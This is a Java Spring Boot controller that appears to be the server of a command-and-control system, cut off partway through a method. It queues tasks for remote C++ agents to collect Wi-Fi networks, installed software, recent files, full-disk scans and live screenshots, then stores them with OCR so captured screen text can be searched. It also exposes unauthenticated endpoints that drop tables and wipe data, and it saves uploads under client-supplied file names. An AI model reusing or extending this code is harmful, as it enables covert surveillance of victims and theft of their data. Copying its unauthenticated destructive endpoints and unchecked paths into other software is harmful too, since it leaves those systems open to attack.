package com.yupi.springbootinit.controller;

import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.yupi.springbootinit.common.BaseResponse;
import com.yupi.springbootinit.common.ErrorCode;
import com.yupi.springbootinit.common.ResultUtils;
import com.yupi.springbootinit.mapper.*;
import com.yupi.springbootinit.model.entity.*;
import com.yupi.springbootinit.utils.CryptoUtils;
import com.yupi.springbootinit.utils.NetUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.HashMap;
import java.util.ArrayList;

import java.io.FileOutputStream;
import java.util.Base64;

/**
 * C2 Controller (Agent Communication)
 */
@RestController
@Slf4j
public class C2Controller {

    @Resource
    private C2TaskMapper c2TaskMapper;

    @Resource
    private C2DeviceMapper c2DeviceMapper;

    @Resource
    private C2SoftwareMapper c2SoftwareMapper;

    @Resource
    private C2WifiMapper c2WifiMapper;

    @Resource
    private C2FileScanMapper c2FileScanMapper;

    @Resource
    private C2ScreenshotMapper c2ScreenshotMapper;

    @Resource
    private com.yupi.springbootinit.service.C2FileScanService c2FileScanService;

    @Resource
    private com.yupi.springbootinit.service.OcrService ocrService;

    private final Gson gson = new Gson();
    
    // Note: C2 endpoints (/heartbeat, /c2/**) do NOT use @AuthCheck because they are accessed by C++ clients, not web users.
    // Web users accessing C2 data should go through C2DeviceController which has @AuthCheck.

    @Resource
    private org.springframework.jdbc.core.JdbcTemplate jdbcTemplate;

    @GetMapping("/reset-schema")
    public String resetSchema() {
        try {
            // Drop tables
            jdbcTemplate.execute("DROP TABLE IF EXISTS c2_wifi");
            jdbcTemplate.execute("DROP TABLE IF EXISTS c2_software");
            jdbcTemplate.execute("DROP TABLE IF EXISTS c2_file_scan");
            jdbcTemplate.execute("DROP TABLE IF EXISTS c2_screenshot");

            // C2 WiFi
            jdbcTemplate.execute("create table if not exists c2_wifi (" +
                    "id bigint auto_increment primary key, " +
                    "device_uuid varchar(64) not null, " +
                    "ssid varchar(128) null, " +
                    "bssid varchar(64) null, " +
                    "signalStrength varchar(32) null, " +
                    "authentication varchar(64) null, " +
                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
                    "isDelete tinyint default 0 not null)");

            // C2 Software
            jdbcTemplate.execute("create table if not exists c2_software (" +
                    "id bigint auto_increment primary key, " +
                    "device_uuid varchar(64) not null, " +
                    "name varchar(256) null, " +
                    "version varchar(128) null, " +
                    "installDate varchar(64) null, " +
                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
                    "isDelete tinyint default 0 not null)");

            // C2 File Scan
            jdbcTemplate.execute("create table if not exists c2_file_scan (" +
                    "id bigint auto_increment primary key, " +
                    "device_uuid varchar(64) not null, " +
                    "fileName varchar(256) null, " +
                    "filePath varchar(512) null, " +
                    "fileSize bigint null, " +
                    "md5 varchar(64) null, " +
                    "lastModified datetime null, " +
                    "isRecent tinyint default 0 null, " +
                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
                    "isDelete tinyint default 0 not null)");
            
            // C2 Screenshot
            jdbcTemplate.execute("create table if not exists c2_screenshot (" +
                    "id bigint auto_increment primary key, " +
                    "device_uuid varchar(64) not null, " +
                    "task_id varchar(64) null, " +
                    "url varchar(512) null, " +
                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
                    "is_delete tinyint default 0 not null)");

            return "Schema reset successfully";
        } catch (Exception e) {
            log.error("Schema reset failed", e);
            return "Failed: " + e.getMessage();
        }
    }

    @GetMapping("/debug/clean")
    public String debugClean() {
        try {
            c2TaskMapper.delete(new QueryWrapper<>());
            c2ScreenshotMapper.delete(new QueryWrapper<>());
            c2FileScanMapper.delete(new QueryWrapper<>());
            c2WifiMapper.delete(new QueryWrapper<>());
            c2SoftwareMapper.delete(new QueryWrapper<>());
            // Optional: Clean uploads
            return "All data cleaned";
        } catch (Exception e) {
            return "Failed: " + e.getMessage();
        }
    }

    @GetMapping("/debug/inject")
    public String debugInject(@RequestParam("uuid") String uuid) {
        try {
            // 1. Inject WiFi
            String wifiTaskId = UUID.randomUUID().toString();
            C2Task wifiTask = new C2Task();
            wifiTask.setTaskId(wifiTaskId);
            wifiTask.setDeviceUuid(uuid);
            wifiTask.setCommand("get_wifi");
            wifiTask.setStatus("pending");
            c2TaskMapper.insert(wifiTask);
            
            Map<String, Object> wifiResultBody = new HashMap<>();
            wifiResultBody.put("taskId", wifiTaskId);
            wifiResultBody.put("uuid", uuid);
            wifiResultBody.put("status", "completed");
            wifiResultBody.put("result", "[{\"ssid\":\"Debug-WiFi-5G\",\"bssid\":\"11:22:33:44:55:66\",\"signal\":-45}, {\"ssid\":\"Debug-WiFi-2.4G\",\"bssid\":\"AA:BB:CC:DD:EE:FF\",\"signal\":-70}]");
            
            // Manually call the processing logic? 
            // Better to just call submitTaskResult but we need a request object.
            // Or just copy the logic. 
            // Let's call submitTaskResult with a mock request? Hard.
            // Let's just instantiate the controller? No, Spring manages it.
            // We can just call the method since we are IN the controller class!
            submitTaskResult(wifiResultBody, null); // Request is only used for Heartbeat/Auth, which we can skip or mock if needed. 
            // Wait, submitTaskResult uses request.getHeader(). If request is null, it might throw NPE if we don't handle it.
            // Looking at code: String hostname = request.getHeader("X-Hostname"); -> NPE if request is null.
            
            // 2. Inject File
            String fileTaskId = UUID.randomUUID().toString();
            C2Task fileTask = new C2Task();
            fileTask.setTaskId(fileTaskId);
            fileTask.setDeviceUuid(uuid);
            fileTask.setCommand("scan_recent");
            fileTask.setStatus("pending");
            c2TaskMapper.insert(fileTask);
            
            Map<String, Object> fileResultBody = new HashMap<>();
            fileResultBody.put("taskId", fileTaskId);
            fileResultBody.put("uuid", uuid);
            fileResultBody.put("status", "completed");
            fileResultBody.put("result", "[{\"name\":\"secret.doc\",\"path\":\"C:\\\\Users\\\\Admin\\\\Documents\\\\secret.doc\",\"size\":1024,\"md5\":\"abcdef123456\",\"isRecent\":1}]");
            
            submitTaskResult(fileResultBody, null);

            // 3. Inject Full Disk Scan (Mocking scan_results.db upload processing)
            // We can't easily mock the file upload here, but we can insert directly into DB using mapper
            C2FileScan fullScan = new C2FileScan();
            fullScan.setDeviceUuid(uuid);
            fullScan.setFilePath("C:\\Windows\\System32\\calc.exe");
            fullScan.setFileName("calc.exe");
            fullScan.setFileSize(20480L);
            fullScan.setMd5("1234567890abcdef");
            fullScan.setIsRecent(0);
            fullScan.setCreateTime(new Date());
            fullScan.setLastModified(new Date());
            c2FileScanMapper.insert(fullScan);

            // 4. Inject Screenshot
            String screenshotTaskId = UUID.randomUUID().toString();
            C2Screenshot screenshot = new C2Screenshot();
            screenshot.setDeviceUuid(uuid);
            screenshot.setTaskId(screenshotTaskId);
            // Use a public placeholder image for testing display
            screenshot.setUrl("https://gw.alipayobjects.com/zos/rmsportal/KDpgvguMpGfqaHPjicRK.svg"); 
            screenshot.setCreateTime(new Date());
            c2ScreenshotMapper.insert(screenshot);

            return "Injected WiFi, File (Recent & Full), and Screenshot data for " + uuid;
        } catch (Exception e) {
            log.error("Injection failed", e);
            return "Failed: " + e.getMessage();
        }
    }

    @PostMapping("/heartbeat")
    public String heartbeat(@RequestBody Map<String, Object> body, HttpServletRequest request) {
        // Try to decrypt if "data" field exists
        Map<String, Object> payload = body;
        if (body.containsKey("data")) {
            String encrypted = (String) body.get("data");
            
            // Priority: Header > Body
            String hostname = request.getHeader("X-Hostname");
            String timestamp = request.getHeader("X-Timestamp");
            
            if (hostname == null) hostname = (String) body.get("hostname");
            if (timestamp == null) timestamp = (String) body.get("timestamp");
            
            if (hostname != null && timestamp != null) {
                String decrypted = CryptoUtils.decode(encrypted, hostname, timestamp); 
                if (decrypted != null) {
                    payload = gson.fromJson(decrypted, new TypeToken<Map<String, Object>>(){}.getType());
                }
            }
        }
        
        // Record heartbeat
        recordHeartbeat(payload, request);
        return "alive";
    }

    @GetMapping("/c2/screenshots")
    public BaseResponse<List<C2Screenshot>> listScreenshots(@RequestParam(value = "uuid", required = false) String uuid,
                                                          @RequestParam(value = "searchText", required = false) String searchText) {
        if (uuid == null || uuid.isEmpty()) {
            return ResultUtils.error(ErrorCode.PARAMS_ERROR, "uuid is required");
        }
        
        LambdaQueryWrapper<C2Screenshot> queryWrapper = new LambdaQueryWrapper<>();
        queryWrapper.eq(C2Screenshot::getDeviceUuid, uuid);
        
        if (org.apache.commons.lang3.StringUtils.isNotBlank(searchText)) {
            queryWrapper.like(C2Screenshot::getOcrResult, searchText);
        }
        
        queryWrapper.orderByDesc(C2Screenshot::getCreateTime);
        return ResultUtils.success(c2ScreenshotMapper.selectList(queryWrapper));
    }
    @GetMapping("/c2/screenshots/download-all")
    public void downloadAllScreenshots(@RequestParam(value = "uuid", required = true) String uuid, 
                                     HttpServletResponse response) {
        try {
            if (uuid == null || uuid.isEmpty()) {
                response.setStatus(400);
                return;
            }
            
            File dir = new File("uploads/" + uuid);
            String zipFilename = "screenshots_" + uuid + ".zip";
            
            if (!dir.exists() || !dir.isDirectory()) {
                response.setStatus(404);
                return;
            }
            
            response.setContentType("application/zip");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + zipFilename + "\"");
            
            try (java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(response.getOutputStream())) {
                File[] files = dir.listFiles((d, name) -> name.endsWith(".png") || name.endsWith(".jpg"));
                if (files != null) {
                    for (File file : files) {
                        java.util.zip.ZipEntry zipEntry = new java.util.zip.ZipEntry(file.getName());
                        zos.putNextEntry(zipEntry);
                        java.nio.file.Files.copy(file.toPath(), zos);
                        zos.closeEntry();
                    }
                }
            }
        } catch (Exception e) {
            log.error("Failed to zip screenshots", e);
            response.setStatus(500);
        }
    }

    @PostMapping("/c2/tasks/pending")
    public Map<String, Object> getPendingTasks(@RequestBody(required = false) Map<String, Object> body, HttpServletRequest request) {
        Map<String, Object> payload = body;
        if (body != null && body.containsKey("data")) {
            String encrypted = (String) body.get("data");
            
            // Priority: Header > Body
            String hostname = request.getHeader("X-Hostname");
            String timestamp = request.getHeader("X-Timestamp");
            
            if (hostname == null) hostname = (String) body.get("hostname");
            if (timestamp == null) timestamp = (String) body.get("timestamp");
            
            if (hostname != null && timestamp != null) {
                String decrypted = CryptoUtils.decode(encrypted, hostname, timestamp);
                if (decrypted != null) {
                    payload = gson.fromJson(decrypted, new TypeToken<Map<String, Object>>(){}.getType());
                }
            }
        }

        // Record heartbeat (legacy support or just ip)
        C2Device device = recordHeartbeat(payload, request);
        
        QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
        queryWrapper.eq("status", "pending");
        // Filter by deviceId if possible, or broadcast (deviceId is null)
        if (device != null) {
            queryWrapper.and(qw -> qw.eq("device_uuid", device.getUuid()).or().isNull("device_uuid"));
        } else {
             queryWrapper.isNull("device_uuid");
        }
        
        List<C2Task> tasks = c2TaskMapper.selectList(queryWrapper);
        
        Map<String, Object> response = new HashMap<>();
        response.put("tasks", tasks);
        // Default 60000ms if null
        response.put("heartbeatInterval", device != null && device.getHeartbeatInterval() != null ? device.getHeartbeatInterval() : 60000);
        
        // Encrypt response? 
        if (body != null && body.containsKey("data")) {
            String jsonResponse = gson.toJson(response);
            
            String clientHostname = request.getHeader("X-Hostname");
            if (clientHostname == null) clientHostname = (String) body.get("hostname");
            
            if (clientHostname == null && device != null) {
                clientHostname = device.getHostName();
            }
            if (clientHostname == null) {
                clientHostname = "Unknown";
            }
            
            String timestamp = String.valueOf(System.currentTimeMillis());
            String encryptedResponse = CryptoUtils.encode(jsonResponse, clientHostname, timestamp);
            
            Map<String, Object> wrapper = new HashMap<>();
            wrapper.put("data", encryptedResponse);
            wrapper.put("hostname", clientHostname);
            wrapper.put("timestamp", timestamp);
            return wrapper;
        }
        
        return response;
    }

    @PostMapping("/c2/tasks/result")
    public BaseResponse<Boolean> submitTaskResult(@RequestBody Map<String, Object> body, HttpServletRequest request) {
        Map<String, Object> payload = body;
        if (body.containsKey("data")) {
            String encrypted = (String) body.get("data");
            
            String hostname = request.getHeader("X-Hostname");
            String timestamp = request.getHeader("X-Timestamp");
            
            if (hostname == null) hostname = (String) body.get("hostname");
            if (timestamp == null) timestamp = (String) body.get("timestamp");
            
            if (hostname != null && timestamp != null) {
                String decrypted = CryptoUtils.decode(encrypted, hostname, timestamp);
                if (decrypted != null) {
                    payload = gson.fromJson(decrypted, new TypeToken<Map<String, Object>>(){}.getType());
                }
            }
        }

        recordHeartbeat(payload, request); // Pass payload to update heartbeat info
        String taskId = (String) payload.get("taskId");
        String result = (String) payload.get("result");
        String status = (String) payload.get("status"); // Support status update

        if (taskId != null) {
            QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
            queryWrapper.eq("taskId", taskId);
            C2Task task = c2TaskMapper.selectOne(queryWrapper);
            if (task != null) {
                // Ensure deviceUuid is set on task if missing (should not happen with new tasks)
                if (task.getDeviceUuid() == null && payload.containsKey("uuid")) {
                    task.setDeviceUuid((String) payload.get("uuid"));
                }
                
                if (result != null) {
                    task.setResult(result);
                }
                if (status != null) {
                    task.setStatus(status);
                } else {
                    task.setStatus("completed"); // Default to completed if not specified
                }
                c2TaskMapper.updateById(task);
                
                // If this was a get_software task, update the device's software list
                if ("get_software".equals(task.getCommand()) && result != null) {
                    try {
                        log.info("Processing software list for task {}, result length: {}", taskId, result.length());
                        
                        String currentDeviceUuid = task.getDeviceUuid();
                        
                        if (currentDeviceUuid == null) {
                            // Try to use the device found in recordHeartbeat if available
                            if (payload.containsKey("uuid")) {
                                currentDeviceUuid = (String) payload.get("uuid");
                            }
                        }
                        
                        log.info("Target Device UUID for software update: {}", currentDeviceUuid);

                        if (currentDeviceUuid != null) {
                            // Try parsing as List<Map> first, then List<String>
                            List<Map<String, Object>> softwareMapList = null;
                            List<String> softwareStringList = null;
                            
                            try {
                                if (result.trim().startsWith("[")) {
                                    softwareMapList = gson.fromJson(result, new TypeToken<List<Map<String, Object>>>(){}.getType());
                                }
                            } catch (Exception e) {
                                // failed to parse as map list, try string list
                            }
                            
                            if (softwareMapList == null || softwareMapList.isEmpty()) {
                                try {
                                    if (result.trim().startsWith("[")) {
                                        softwareStringList = gson.fromJson(result, new TypeToken<List<String>>(){}.getType());
                                    } else {
                                        log.warn("Software result is not JSON list, skipping parse: {}", result);
                                    }
                                } catch (Exception e) {
                                    log.error("Failed to parse software JSON list as Map or String. Raw result: {}", result);
                                }
                            }
                            
                            if ((softwareMapList != null && !softwareMapList.isEmpty()) || (softwareStringList != null && !softwareStringList.isEmpty())) {
                                log.info("Parsed software entries. Deleting old records for device UUID {}", currentDeviceUuid);
                                
                                // Clear old software list for this device
                                QueryWrapper<C2Software> deleteWrapper = new QueryWrapper<>();
                                deleteWrapper.eq("device_uuid", currentDeviceUuid);
                                int deleted = c2SoftwareMapper.delete(deleteWrapper);
                                log.info("Deleted {} old software records", deleted);
    
                                int successCount = 0;
                                
                                // Handle Map List
                                if (softwareMapList != null) {
                                    for (Map<String, Object> soft : softwareMapList) {
                                        try {
                                            C2Software c2Software = new C2Software();
                                            c2Software.setDeviceUuid(currentDeviceUuid);
                                            
                                            // Flexible key handling
                                            Object nameObj = soft.get("name") != null ? soft.get("name") : soft.get("DisplayName");
                                            String name = nameObj != null ? String.valueOf(nameObj) : null;
                                            
                                            Object versionObj = soft.get("version") != null ? soft.get("version") : soft.get("DisplayVersion");
                                            String version = versionObj != null ? String.valueOf(versionObj) : null;
                                            
                                            Object dateObj = soft.get("installDate") != null ? soft.get("installDate") : soft.get("InstallDate");
                                            String date = dateObj != null ? String.valueOf(dateObj) : null;
                                            
                                            if (name == null || name.trim().isEmpty()) {
                                                continue; 
                                            }
                                            
                                            c2Software.setName(name);
                                            c2Software.setVersion(version);
                                            c2Software.setInstallDate(date);
                                            c2Software.setCreateTime(new Date());
                                            c2SoftwareMapper.insert(c2Software);
                                            successCount++;
                                        } catch (Exception e) {
                                            log.warn("Skipping invalid software entry: {} Error: {}", soft, e.getMessage());
                                        }
                                    }
                                }
                                
                                // Handle String List (e.g. ["App (v1.0)", "App2"])
                                if (softwareStringList != null) {
                                    for (String softStr : softwareStringList) {
                                        if (softStr == null || softStr.trim().isEmpty()) continue;
                                        try {
                                            C2Software c2Software = new C2Software();
                                            c2Software.setDeviceUuid(currentDeviceUuid);
                                            
                                            String name = softStr;
                                            String version = null;
                                            
                                            // Try to extract version if format is "Name (Version)"
                                            // E.g. "Git (2.52.0)"
                                            if (softStr.endsWith(")") && softStr.contains("(")) {
                                                int lastOpen = softStr.lastIndexOf("(");
                                                if (lastOpen > 0) {
                                                    name = softStr.substring(0, lastOpen).trim();
                                                    version = softStr.substring(lastOpen + 1, softStr.length() - 1);
                                                }
                                            }
                                            
                                            c2Software.setName(name);
                                            c2Software.setVersion(version);
                                            c2Software.setCreateTime(new Date());
                                            c2SoftwareMapper.insert(c2Software);
                                            successCount++;
                                        } catch (Exception e) {
                                            log.error("Failed to insert software string: " + softStr, e);
                                        }
                                    }
                                }
                                
                                log.info("Successfully inserted {} software records for device {}", successCount, currentDeviceUuid);
                            } else {
                                log.warn("Software list is empty or null for task {}", taskId);
                            }
                        } else {
                            log.error("Cannot process software list: deviceUuid is null for task {}", taskId);
                        }
                    } catch (Exception e) {
                        log.error("Failed to process software list: ", e);
                    }
                }
                
                // If this was a get_wifi task, update the device's wifi data
                if ("get_wifi".equals(task.getCommand()) && result != null) {
                    try {
                        String currentDeviceUuid = task.getDeviceUuid();
                        log.info("Processing WiFi results for device: {}, result length: {}", currentDeviceUuid, result.length());
                        
                        if (currentDeviceUuid == null) {
                            // Try to use the device found in recordHeartbeat if available
                            if (payload.containsKey("uuid")) {
                                currentDeviceUuid = (String) payload.get("uuid");
                            }
                        }
                        
                        log.info("Target Device UUID for WiFi update: {}", currentDeviceUuid);

                        if (currentDeviceUuid != null) {
                            List<Map<String, Object>> wifiList = null;
                            try {
                                if (result.trim().startsWith("[")) {
                                    wifiList = gson.fromJson(result, new TypeToken<List<Map<String, Object>>>(){}.getType());
                                    log.info("Parsed {} WiFi entries", wifiList != null ? wifiList.size() : 0);
                                } else {
                                    log.warn("Wifi result is not JSON list, skipping parse: {}", result);
                                }
                            } catch (Exception e) {
                                log.error("Failed to parse wifi JSON list. Raw result: {}", result);
                            }
                            
                            if (wifiList != null) {
                                // Clear old wifi list
                                QueryWrapper<C2Wifi> deleteWrapper = new QueryWrapper<>();
                                deleteWrapper.eq("device_uuid", currentDeviceUuid);
                                int deleted = c2WifiMapper.delete(deleteWrapper);
                                log.info("Deleted {} old WiFi records", deleted);
    
                                int inserted = 0;
                                for (Map<String, Object> wifi : wifiList) {
                                    try {
                                        C2Wifi c2Wifi = new C2Wifi();
                                        c2Wifi.setDeviceUuid(currentDeviceUuid); // Set UUID
                                        c2Wifi.setSsid((String) wifi.get("ssid"));
                                        c2Wifi.setBssid((String) wifi.get("bssid"));
                                        // Handle signal strength as number or string
                                        Object signal = wifi.get("signal");
                                        c2Wifi.setSignalStrength(signal != null ? String.valueOf(signal) : "");
                                        c2Wifi.setCreateTime(new Date());
                                        c2WifiMapper.insert(c2Wifi);
                                        inserted++;
                                    } catch (Exception e) {
                                        log.error("Skipping invalid wifi entry: " + wifi, e);
                                    }
                                }
                                log.info("Updated wifi list for device {}, inserted {} records", currentDeviceUuid, inserted);
                            }
                        } else {
                            log.error("Cannot process wifi list: deviceUuid is null for task {}", taskId);
                        }
                    } catch (Exception e) {
                        log.error("Failed to parse wifi list: ", e);
                    }
                }

                // If this was a scan_recent task, update the device's recent files
                if ("scan_recent".equals(task.getCommand()) && result != null) {
                    try {
                        String currentDeviceUuid = task.getDeviceUuid();
                        
                        if (currentDeviceUuid == null) {
                            if (payload.containsKey("uuid")) {
                                currentDeviceUuid = (String) payload.get("uuid");
                            }
                        }

                        if (currentDeviceUuid != null) {
                            List<Map<String, Object>> fileList = null;
                            try {
                                fileList = gson.fromJson(result, new TypeToken<List<Map<String, Object>>>(){}.getType());
                            } catch (Exception e) {
                                log.error("Failed to parse recent files JSON list. Raw result: {}", result);
                            }
                            
                            if (fileList != null) {
                                // Clear old recent files for this device
                                QueryWrapper<C2FileScan> deleteWrapper = new QueryWrapper<>();
                                deleteWrapper.eq("device_uuid", currentDeviceUuid);
                                deleteWrapper.eq("isRecent", 1);
                                c2FileScanMapper.delete(deleteWrapper);
    
                                for (Map<String, Object> file : fileList) {
                                    try {
                                        C2FileScan c2FileScan = new C2FileScan();
                                        c2FileScan.setDeviceUuid(currentDeviceUuid); // Set UUID
                                        c2FileScan.setFilePath((String) file.get("path"));
                                        c2FileScan.setFileName((String) file.get("name"));
                                        // Handle potential double/long type mismatch from JSON
                                        Object sizeObj = file.get("size");
                                        if (sizeObj instanceof Number) {
                                            c2FileScan.setFileSize(((Number) sizeObj).longValue());
                                        }
                                        c2FileScan.setMd5((String) file.get("md5"));
                                        c2FileScan.setIsRecent(1);
                                        c2FileScan.setLastModified(new Date()); // Ideally parse from result if available
                                        c2FileScan.setCreateTime(new Date());
                                        c2FileScanMapper.insert(c2FileScan);
                                    } catch (Exception e) {
                                        log.warn("Skipping invalid recent file entry: {}", file);
                                    }
                                }
                                log.info("Updated recent files for device {}", currentDeviceUuid);
                            }
                        }
                    } catch (Exception e) {
                         log.error("Failed to parse recent files list: ", e);
                    }
                }

                // If this was a set_heartbeat task, update the device's heartbeat interval
                if ("set_heartbeat".equals(task.getCommand()) && result != null && task.getDeviceUuid() != null) {
                    try {
                        Integer newInterval = Integer.parseInt(result);
                        C2Device device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", task.getDeviceUuid()));
                        if (device != null) {
                            device.setHeartbeatInterval(newInterval);
                            c2DeviceMapper.updateById(device);
                        }
                    } catch (NumberFormatException e) {
                        log.error("Failed to parse new heartbeat interval: " + result);
                    }
                }

                // If this was a screenshot task (Base64 result), save to file and DB
                if ("screenshot".equals(task.getCommand()) && result != null) {
                    try {
                         String uuid = task.getDeviceUuid();
                         
                         // Try to resolve Device ID / UUID
                         C2Device device = null;
                         if (uuid != null) {
                             device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", uuid));
                         }
                         
                         // If we still have no UUID, try to generate or use placeholder
                         if (uuid == null || uuid.isEmpty()) {
                             if (device != null && device.getUuid() != null && !device.getUuid().isEmpty()) {
                                 uuid = device.getUuid();
                             } else {
                                 // Fallback
                                 uuid = UUID.randomUUID().toString();
                                 log.warn("Screenshot for unknown device, using temp UUID: {}", uuid);
                             }
                         }
                         
                         log.info("Saving screenshot for device UUID: {}", uuid);
                    
                         byte[] imageBytes = Base64.getDecoder().decode(result);
                         String filename = "screenshot_" + System.currentTimeMillis() + ".png";
                         String uploadDir = "uploads/" + uuid;
                         File dir = new File(uploadDir);
                         if (!dir.exists()) {
                             dir.mkdirs();
                         }
                         
                         File dest = new File(dir, filename);
                         try (FileOutputStream fos = new FileOutputStream(dest)) {
                             fos.write(imageBytes);
                         }
                         
                         // Create C2Screenshot record
                         C2Screenshot screenshot = new C2Screenshot();
                         screenshot.setDeviceUuid(uuid);
                         screenshot.setTaskId(taskId);
                         String url = "/api/c2/download?uuid=" + uuid + "&filename=" + filename; 
                         
                         screenshot.setUrl(url);
                         
                         // Perform OCR
                         String ocrText = ocrService.doOcr(dest);
                         screenshot.setOcrResult(ocrText);

                         screenshot.setCreateTime(new Date());
                         c2ScreenshotMapper.insert(screenshot);
                         
                         // Update task result to point to file instead of raw base64 (too large)
                         task.setResult(url);
                         c2TaskMapper.updateById(task);
                         
                    } catch (Exception e) {
                        log.error("Failed to save screenshot: ", e);
                    }
                }

                // Handle start_monitor result (which is also a screenshot)
                if ("start_monitor".equals(task.getCommand()) && result != null) {
                    try {
                         String uuid = task.getDeviceUuid();
                         
                         C2Device device = null;
                         if (uuid != null) {
                             device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", uuid));
                         }

                         // Update device status
                         if (result.startsWith("Monitor started")) {
                             if (device != null) {
                                 device.setIsMonitorOn(1);
                                 c2DeviceMapper.updateById(device);
                             }
                         } else if (result.length() > 100) {
                             // It's an image
                             
                             if (uuid == null || uuid.isEmpty()) {
                                 if (device != null && device.getUuid() != null && !device.getUuid().isEmpty()) {
                                     uuid = device.getUuid();
                                 } else {
                                     uuid = UUID.randomUUID().toString();
                                 }
                             }
                             
                             // Ensure status is ON
                             if (device != null && (device.getIsMonitorOn() == null || device.getIsMonitorOn() == 0)) {
                                 device.setIsMonitorOn(1);
                                 c2DeviceMapper.updateById(device);
                             }

                             byte[] imageBytes = Base64.getDecoder().decode(result);
                             String filename = "monitor_" + System.currentTimeMillis() + ".png";
                             String uploadDir = "uploads/" + uuid;
                             File dir = new File(uploadDir);
                             if (!dir.exists()) {
                                 dir.mkdirs();
                             }
                             
                             File dest = new File(dir, filename);
                             try (FileOutputStream fos = new FileOutputStream(dest)) {
                                 fos.write(imageBytes);
                             }
                             
                             // Create C2Screenshot record
                             C2Screenshot screenshot = new C2Screenshot();
                             screenshot.setDeviceUuid(uuid);
                             screenshot.setTaskId(taskId); 
                             // Prefer UUID for download url if possible
                             String url = "/api/c2/download?uuid=" + uuid + "&filename=" + filename;

                             // Perform OCR
                             String ocrText = ocrService.doOcr(dest);
                             screenshot.setOcrResult(ocrText);
                             screenshot.setUrl(url);
                             screenshot.setCreateTime(new Date());
                             c2ScreenshotMapper.insert(screenshot);
                             
                             // Update task result to point to file instead of raw base64
                             task.setResult(url);
                             c2TaskMapper.updateById(task);
                         }
                    } catch (Exception e) {
                        // ignore if not image
                    }
                }
                
                // Handle stop_monitor
                if ("stop_monitor".equals(task.getCommand()) && task.getDeviceUuid() != null) {
                     C2Device device = c2DeviceMapper.selectOne(new QueryWrapper<C2Device>().eq("uuid", task.getDeviceUuid()));
                     if (device != null) {
                         device.setIsMonitorOn(0);
                         c2DeviceMapper.updateById(device);
                     }
                }
            }
        }
        return ResultUtils.success(true);
    }
    
    /**
     * Handle file upload from client
     */
    @PostMapping("/c2/upload")
    public BaseResponse<String> uploadFile(@RequestParam("file") MultipartFile file,
                                           @RequestParam("uuid") String uuid,
                                           @RequestParam(value = "taskId", required = false) String taskId,
                                           HttpServletRequest request) {
        if (file.isEmpty()) {
            return ResultUtils.error(ErrorCode.PARAMS_ERROR, "File is empty");
        }
        
        C2Device device = null;
        
        // Try to look up device to get its UUID
        QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
        queryWrapper.eq("uuid", uuid);
        device = c2DeviceMapper.selectOne(queryWrapper);
        
        String targetDirName;
        
        if (device != null) {
            targetDirName = device.getUuid();
        } else {
            // Device not found
            // If uuid looks like a UUID, use it
            if (uuid.length() > 30 && uuid.contains("-")) {
                 targetDirName = uuid;
            } else {
                 // It's likely a numeric ID but device not found. Use a random UUID to avoid using number as folder.
                 log.warn("Upload from unknown device UUID {}. Using random UUID.", uuid);
                 targetDirName = UUID.randomUUID().toString();
            }
        }

        // Save file
        String filename = file.getOriginalFilename();
        String uploadDir = "uploads/" + targetDirName;
        File dir = new File(uploadDir);
        if (!dir.exists()) {
            dir.mkdirs();
        }
        
        // Handle scan_disk optimization (SQLite DB upload)
        // Allow variations like "scan_results.db" or "scan_results_uuid.db"
        if (filename != null && filename.startsWith("scan_results") && filename.endsWith(".db")) {
             try {
                 // Save to uploads directory instead of system temp to avoid permission/space issues
                 File tempDb = new File(dir, "scan_" + taskId + "_" + System.currentTimeMillis() + ".db");
                 log.info("Saving scan results to: {}", tempDb.getAbsolutePath());
                 file.transferTo(tempDb);
                 
                 // Process asynchronously
                 java.util.concurrent.CompletableFuture.runAsync(() -> {
                     processScanResults(tempDb, targetDirName, taskId);
                 });
                 
                 return ResultUtils.success("Scan results uploaded, processing in background");
             } catch (IOException e) {
                 log.error("Failed to save scan DB. Target path: " + (dir != null ? dir.getAbsolutePath() : "null"), e);
                 return ResultUtils.error(ErrorCode.SYSTEM_ERROR, "Upload failed: " + e.getMessage());
             }
        }

        // Standard file upload
        File dest = new File(dir, filename);
        try {
            file.transferTo(dest);
            
            // Update task status if taskId is provided (fixes "waiting" status)
            if (taskId != null) {
                C2Task task = c2TaskMapper.selectOne(new QueryWrapper<C2Task>().eq("taskId", taskId));
                if (task != null) {
                    task.setStatus("completed");
                    task.setResult("File uploaded: " + filename);
                    c2TaskMapper.updateById(task);

                    // Handle screenshot upload
                    if ("get_screenshot".equals(task.getCommand())) {
                        C2Screenshot screenshot = new C2Screenshot();
                        
                        screenshot.setDeviceUuid(targetDirName);
                        screenshot.setTaskId(taskId);
                        // Construct URL for download
                        String url = "/api/c2/download?uuid=" + targetDirName + "&filename=" + filename;
                        screenshot.setUrl(url);
                        screenshot.setCreateTime(new Date());
                        c2ScreenshotMapper.insert(screenshot);
                    }
                }
            }
            
            return ResultUtils.success("File uploaded successfully");
        } catch (IOException e) {
            log.error("Upload failed", e);
            return ResultUtils.error(ErrorCode.SYSTEM_ERROR, "Upload failed");
        }
    }

    private void processScanResults(File tempDb, String deviceUuid, String taskId) {
        log.info("Processing scan results for device: {}, taskId: {}", deviceUuid, taskId);
        // Find device by UUID
        QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
        queryWrapper.eq("uuid", deviceUuid);
        C2Device device = c2DeviceMapper.selectOne(queryWrapper);
        // We allow processing even if device not in DB, as long as we have UUID
        
        try {
            log.info("Processing DB file: {}", tempDb.getAbsolutePath());
            
            // Connect to SQLite
